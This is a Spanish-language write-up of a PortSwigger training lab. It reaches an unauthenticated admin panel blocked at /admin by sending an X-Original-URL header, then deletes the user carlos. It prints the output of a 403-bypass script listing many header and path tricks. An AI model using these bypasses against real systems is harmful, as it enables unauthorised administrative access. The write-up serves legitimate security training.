---
title: "Access Control Vulnerabilities Lab 10"
date: 2024-12-05 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - Access Control Vulnerabilities
tags:
  - Access Control Vulnerabilities
  - URL-based access control can be circumvented
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Skills

- URL-based access control can be circumvented

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `sitio web` tiene un `panel de administración` no autenticado en `/admin`, pero se ha configurado un sistema de `front-end` para bloquear el acceso externo a esa ruta. Sin embargo, la `aplicación de back-end` está construida sobre un `framework` que soporta el encabezado `X-Original-URL`. Para `resolver` el laboratorio, debemos `acceder` al `panel de administración` y `eliminar` al `usuario carlos`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Access-Control-Vulnerabilities-Lab-10/image_1.png)

Si pulsamos en `Admin panel` no nos deja acceder y nos muestra un código de estado `403 Access Denied`. Existe una herramienta llamada `bypas-403` [https://github.com/v0rl0x/bypass-403-updated.git](https://github.com/v0rl0x/bypass-403-updated.git), la cual mediante diferentes `headers` intenta `bypassear` este código de estado. Podemos encontrar `payloads` y otras herramientas en `Hacktricks` [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses). Es importante probar con `/admin` y con `admin` debido a que hay varias cabeceras que necesitan una ruta

```
# ./bypass-403.sh https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net /admin
 ____                                  _  _    ___ _____ 
| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ / 
|  _ \| | | | '_ \ / _` / __/ __|_____| || |_| | | ||_ \ 
| |_) | |_| | |_) | (_| \__ \__ \_____|__   _| |_| |__) |
|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/ 
       |___/|_|                                          
                                               By Iam_J0ker
./bypass-403.sh https://example.com path
 
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net/%2e//admin
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin/.
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net///admin//
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net/.//admin/./
200,3114  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin -H X-Original-URL: /admin
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin -H X-Custom-IP-Authorization: 127.0.0.1
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin -H X-Forwarded-For: http://127.0.0.1
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin -H X-Forwarded-For: 127.0.0.1:80
200,10707  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net -H X-re
write-url: /admin
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin%20
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin%09
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin?
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin.html
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin/?anything
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin#
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin -H Content-Length:0 -X POST
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin/*
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin.php
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin.json
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin  -X TRACE
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin -H X-Host: 127.0.0.1
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin..;/
000,0  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin;/
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin -X TRACE
404,11  --> https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net//admin -H X-Forwarded-Host: 127.0.0.1
Way back machine:
{
  "available": null,
  "url": null
}
```

Si `capturamos` la `petición` y aplicamos la cabecera `X-Original-Url: /admin`

![](/assets/img/Access-Control-Vulnerabilities-Lab-10/image_2.png)

Hacemos click derecho, pulsamos sobre `Show response in browser` y accedemos a un panel administrativo

![](/assets/img/Access-Control-Vulnerabilities-Lab-10/image_3.png)

Si intentamos `eliminar` a un `usuario` no nos dejará y nos `redirigirá` a `https://0a2a003604de8f1180f0ade5008900ae.web-security-academy.net/admin/delete?username=carlos`. Debemos realizar la `petición` de esta forma para poder `eliminar` al usuario `carlos`

![](/assets/img/Access-Control-Vulnerabilities-Lab-10/image_4.png)
